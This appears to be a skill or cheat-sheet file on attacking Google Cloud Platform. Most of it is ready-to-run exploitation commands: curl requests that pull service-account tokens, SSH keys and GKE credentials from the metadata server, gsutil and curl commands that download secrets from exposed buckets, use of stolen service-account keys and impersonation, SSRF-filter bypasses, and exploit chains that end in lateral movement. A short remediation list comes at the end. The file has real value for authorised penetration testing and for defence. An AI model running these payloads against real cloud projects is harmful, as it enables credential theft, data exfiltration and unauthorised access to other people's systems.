---
name: gcp
description: GCP cloud security assessment and exploitation techniques
---

# GCP Security

## Attack Surface

- Metadata server at metadata.google.internal accessible via SSRF
- Service account keys exported as JSON files with no expiration
- GCS buckets with uniform or fine-grained ACLs misconfigured for public access
- Cloud Functions with overprivileged service accounts
- Default compute service account with project Editor role
- Exposed Cloud Run / App Engine endpoints without IAM authentication
- Firestore/Datastore with open security rules

## Detection Techniques

- Test metadata from SSRF: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/`
- Enumerate GCS buckets: `gsutil ls gs://<company>-backup` or via `storage.googleapis.com/<bucket>`
- Check public bucket: `curl https://storage.googleapis.com/<bucket>`
- List service account keys: `gcloud iam service-accounts keys list --iam-account=<sa>`
- Identify Cloud Functions: `gcloud functions list --project <project>`
- Check default compute SA scope: `gcloud compute instances describe <instance>`

## Common Payloads

### Metadata Credential Theft
```bash
# Access token for default service account
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Full service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Project-level metadata (may contain startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Instance SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Kubernetes cluster credentials (GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
```

### GCS Bucket Exploitation
```bash
# Unauthenticated listing
curl "https://storage.googleapis.com/<bucket>"
gsutil ls gs://<bucket> 2>/dev/null

# Download objects
gsutil cp gs://<bucket>/secrets.env .
curl "https://storage.googleapis.com/<bucket>/backup.sql"

# Check bucket ACL
gsutil iam get gs://<bucket>
```

### Service Account Key Abuse
```bash
# Authenticate with stolen JSON key
gcloud auth activate-service-account --key-file=stolen-key.json

# Generate access token from key
gcloud auth print-access-token

# Impersonate another service account
gcloud auth print-access-token --impersonate-service-account=<target-sa>
```

### Cloud Function Exploitation
```bash
# List functions and their source
gcloud functions describe <func-name> --format=json

# Read function source code (if source repo or GCS accessible)
gsutil cp gs://<project>-cloud-functions/<func-name>.zip .

# Invoke directly if allUsers invoker role is set
curl https://<region>-<project>.cloudfunctions.net/<func-name>
```

## Bypass Techniques

- Metadata requires `Metadata-Flavor: Google` header; bypass SSRF filters using DNS rebinding to metadata.google.internal
- Use alternative metadata IP `169.254.169.254` which also works on GCP
- Service account impersonation chain: SA-A impersonates SA-B with higher privileges
- GCS signed URLs bypass bucket-level IAM when leaked
- Access Cloud Functions via their trigger URL even without `gcloud` access

## Exploit Chaining

- SSRF + metadata: steal service account token from vulnerable web app
- SA token + IAM escalation: use `iam.serviceAccountTokenCreator` to impersonate admin SA
- GCS read + secrets: extract Terraform state, `.env` files, database exports
- Cloud Function source + hardcoded creds: read function code to find API keys and DB passwords
- Metadata SSH keys + lateral movement: inject SSH key via project metadata to access other instances

## Remediation

- Enforce metadata server v2 with `Metadata-Flavor: Google` header requirement
- Use Workload Identity instead of exported service account keys
- Apply least-privilege IAM; avoid default compute SA with Editor role
- Enable GCS uniform bucket-level access and Block Public Access
- Set `iam.disableServiceAccountKeyCreation` org policy
- Use VPC Service Controls to prevent data exfiltration
- Audit with `gcloud asset search-all-iam-policies` for overprivileged bindings
